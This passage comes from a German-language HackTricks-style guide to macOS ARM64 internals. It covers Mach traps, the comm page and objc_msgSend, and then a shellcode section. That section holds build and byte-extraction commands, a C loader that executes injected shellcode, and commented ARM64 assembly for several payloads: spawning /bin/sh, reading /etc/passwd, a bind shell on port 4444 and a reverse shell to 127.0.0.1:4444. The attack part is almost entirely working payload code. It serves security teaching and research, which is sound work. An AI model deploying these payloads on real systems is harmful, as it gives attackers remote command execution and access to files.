Check out in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) the `mach_trap_table` and in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) the prototypes. Die maximale Anzahl von Mach-Traps ist `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

You can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Beachte, dass **Ida** und **Ghidra** auch **specific dylibs** aus dem Cache dekompilieren können, indem man einfach den Cache übergibt.

> [!TIP]
> Manchmal ist es einfacher, den **decompiled** Code aus **`libsystem_kernel.dylib`** zu prüfen, als den **source code** zu lesen, da der Code mehrerer syscalls (BSD und Mach) per Skript generiert wird (siehe Kommentare im Quellcode). In der dylib hingegen kannst du finden, was tatsächlich aufgerufen wird.

### machdep calls

XNU unterstützt einen anderen Typ von Aufrufen, genannt machine dependent. Die Nummern dieser Aufrufe hängen von der Architektur ab, und weder die Aufrufe noch die Nummern sind garantiert konstant.

### comm page

Das ist eine kernel-eigene Memory-Page, die in den Adressraum jedes Benutzerprozesses gemappt wird. Sie soll den Übergang vom Benutzermodus in den Kernel-Space beschleunigen, da die Verwendung von syscalls für Kernel-Services, die sehr häufig genutzt werden, diesen Übergang sonst sehr ineffizient machen würde.

Zum Beispiel liest der Aufruf `gettimeofdate` den Wert von `timeval` direkt aus der comm page.

### objc_msgSend

Es ist sehr üblich, diese Funktion in Objective-C- oder Swift-Programmen zu finden. Diese Funktion ermöglicht das Aufrufen einer Methode eines Objective-C-Objekts.

Parameter ([mehr Infos in den Docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Zeiger auf die Instanz
- x1: op -> Selector der Methode
- x2... -> Die restlichen Argumente der aufgerufenen Methode

Wenn du also einen Breakpoint vor dem Branch zu dieser Funktion setzt, kannst du mit lldb leicht herausfinden, was aufgerufen wird (in diesem Beispiel ruft das Objekt ein Objekt von `NSConcreteTask` auf, das einen Befehl ausführt):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Wenn die Umgebungsvariable **`NSObjCMessageLoggingEnabled=1`** gesetzt ist, kann protokolliert werden, wann diese Funktion aufgerufen wird — z. B. in einer Datei wie `/tmp/msgSends-pid`.
>
> Außerdem kann man durch Setzen von **`OBJC_HELP=1`** und Ausführen eines beliebigen Binaries weitere Umgebungsvariablen sehen, die man zum **Protokollieren** verwenden kann, wenn bestimmte Objc-C-Aktionen auftreten.

Wenn diese Funktion aufgerufen wird, muss die aufgerufene Methode der angegebenen Instanz gefunden werden; dafür werden verschiedene Suchvorgänge durchgeführt:

- Führe optimistischen Cache-Lookup durch:
- Wenn erfolgreich, fertig
- runtimeLock erwerben (read)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Versuche den eigenen Klassen-Cache:
- Wenn erfolgreich, fertig
- Versuche die Methodenliste der Klasse:
- Wenn gefunden, Cache füllen und fertig
- Versuche Cache der Superklasse:
- Wenn erfolgreich, fertig
- Versuche Methodenliste der Superklasse:
- Wenn gefunden, Cache füllen und fertig
- If (resolver) try method resolver, and repeat from class lookup
- Wenn noch hier (= alles andere ist fehlgeschlagen), versuche forwarder

### Shellcodes

Zum Kompilieren:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Um die Bytes zu extrahieren:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Für neuere macOS-Versionen:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C code, um den shellcode zu testen</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Entnommen von [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) und erklärt.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Mit cat lesen

Das Ziel ist es, `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` auszuführen, daher ist das zweite Argument (x1) ein Array von params (was im Speicher einem Stack von Adressen entspricht).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Befehl mit sh aus einem fork aufrufen, damit der Hauptprozess nicht beendet wird
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell von [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) auf **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Von [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell an **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
